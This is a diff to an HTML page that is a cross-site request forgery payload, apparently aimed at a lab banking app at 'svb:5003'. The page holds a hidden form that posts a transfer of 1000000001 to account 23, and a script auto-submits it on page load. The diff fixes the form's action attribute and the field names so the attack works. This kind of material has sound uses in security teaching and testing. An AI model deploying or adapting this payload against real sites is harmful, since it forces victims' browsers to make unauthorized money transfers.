@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <form id=action="http://svb:5003/transfer/1" method="POST">
-            <input type="hidden" name="To account number" value="23" />
-            <input type="hidden" name="Amount" value="1000000001" />
+        <form action="http://svb:5003/transfer/1" method="POST">
+            <input type="hidden" name="account" value="23" />
+            <input type="hidden" name="amount" value="1000000001" />
         </form>
         <script>
             document.forms[0].submit();
